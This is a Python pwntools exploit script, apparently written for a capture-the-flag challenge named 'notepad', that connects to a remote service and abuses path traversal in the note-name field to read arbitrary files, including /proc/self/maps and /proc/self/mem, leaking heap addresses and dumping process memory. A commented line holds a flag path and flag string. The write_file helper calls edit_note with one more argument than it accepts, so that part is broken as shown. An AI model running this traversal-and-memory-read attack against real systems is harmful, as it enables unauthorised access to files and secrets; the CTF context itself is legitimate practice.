from pwn import *

context.arch = 'amd64'
#r = process('./notepad')
r = remote('10.113.184.121',24338)
def login(username,password):
    r.sendlineafter(b'> ',b'1')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)

def register(username,password):
    r.sendlineafter(b'> ',b'2')
    r.sendafter(b'Username: ',username)
    r.sendafter(b'Password: ',password)    

def new_note(name,length):
    r.sendlineafter(b'> ',b'3')
    r.sendafter(b'Note Name: ',name)
    r.sendafter(b'Content Length: ',str(length).encode())

def edit_note(name,offset,length):
    r.sendlineafter(b'> ',b'4')
    r.sendafter(b'Note Name: ',name)
    r.sendafter(b'Offset: ',str(offset).encode())
    r.sendafter(b'Content Length: ',str(length).encode())

def show_note(name,offset):
    r.sendlineafter(b'> ',b'5')
    r.sendafter(b'Note Name: ',name)
    r.sendlineafter(b'Offset: ',str(offset).encode())

def read_file(filename,offset):
    path = b'../'* 5 + b'/' * (92-len(filename)) + filename
    show_note(path,offset)
    return r.recv(128)
def write_file(filename,offset,length,content):
    path = b'../'* 5 + b'/' * (92-len(filename)) + filename
    edit_note(path,offset,length,content)
register(b'b',b'b')
login(b'b',b'b')


# read_file(b'/proc/self/maps',764)
# r.recvuntil(b'backend_')
# backend_path = b'/home/notepad/backend_' + r.recvuntil(b' ',drop=True)
# print(backend_path)
heap_base = int(read_file(b'/proc/self/maps',0)[:12],16)
print(hex(heap_base))

a = read_file(b'/proc/self/mem',heap_base+0x4f00)

f = open('./123','wb')
f.write(a)
#note_name = b'../'* 15 + b'/'*52 + b'/flag_user'  # flag{Sh3l1cod3_but_y0u_c@nnot_get_she!!}
#show_note(note_name,0)



r.interactive()